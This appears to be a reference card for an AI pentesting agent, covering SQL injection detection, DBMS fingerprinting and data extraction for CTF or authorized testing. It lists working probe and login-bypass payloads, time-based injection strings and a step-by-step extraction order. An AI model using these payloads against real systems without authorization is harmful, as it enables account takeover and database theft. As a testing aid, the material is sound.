---
name: web-sqli
description: >
  SQL injection detection, DBMS fingerprint, and extraction. Use when a web input
  reaches a DB query: SQL errors, login-bypass anomaly, boolean/time diff, or UNION
  opportunity. Reference card — pull the DBMS/technique file from references/ for depth.
tags: [web, sqli, injection, database, auth-bypass]
environment: [ctf, lab, authorized-testing]
budget:
  stuck_threshold: 3
  on_stuck: pivot
  stop_conditions:
    - "same injection point: 3 payloads, no new signal"
    - "WAF block confirmed after 2 bypass tries"
---

# SQL Injection — Reference Card

## Confirm the primitive (cheapest first)
Baseline rồi so sánh: `id=1` vs `id=1'` vs `id=1 AND 1=1` vs `id=1 AND 1=2`.
- Lỗi SQL hiện ra        -> error-based
- true/false khác nhau   -> boolean-blind
- timing thay đổi        -> time-blind
- cột phản chiếu ra HTML -> UNION

First probes:
- error: `1'`
- bool : `' AND 1=1-- -`  vs  `' AND 1=2-- -`
- time : MySQL `' AND SLEEP(5)-- -` | PG `' AND pg_sleep(5)-- -` | MSSQL `'; WAITFOR DELAY '0:0:5'-- -`
- union: `' ORDER BY N-- -` tăng N tới khi lỗi = số cột; rồi `' UNION SELECT NULL,NULL,...-- -`

## Auth bypass (login) — thử trước
`' OR '1'='1'-- -`  ·  `admin'-- -`  ·  `admin'#`  ·  `') OR ('1'='1`  ·  `" OR 1=1-- -`

## Route to depth (references/)
| Dấu hiệu | Đọc file |
|---|---|
| lỗi SQL hiện ra | error-based.md + <dbms>.md |
| response true/false khác | boolean-blind.md |
| timing thay đổi | time-blind.md |
| cần đọc/ghi file | file-operations.md |
| WAF chặn | waf-evasion.md |
| Mongo / JSON `$ne`,`$gt` | nosql.md |
| DBMS đã xác định | mysql.md / postgresql.md / mssql.md / oracle.md |
| chưa rõ, cần checklist | detection.md |

Fingerprint nhanh: MySQL `@@version` · PG `version()` · MSSQL `@@version` · Oracle `v$version`.
Payload đầy đủ nằm trong <dbms>.md — detect 1 lần rồi đọc đúng file, đừng nhớ hết.

## Extraction order
db names -> tables (`information_schema.tables`) -> columns -> target rows -> file/OOB.

## Pull thêm payload (biến thể / bypass filter cụ thể)
Đọc thêm biến thể trong `../ctf-web/sql-injection.md`.

## Discipline (../LOOP_DISCIPLINE.md)
- Xác nhận primitive TRƯỚC khi exfil. Một injection point, probe rẻ nhất trước.
- 3 payload cùng điểm không đổi tín hiệu -> WAF hoặc sai điểm -> đổi hướng, KHÔNG spam payload.
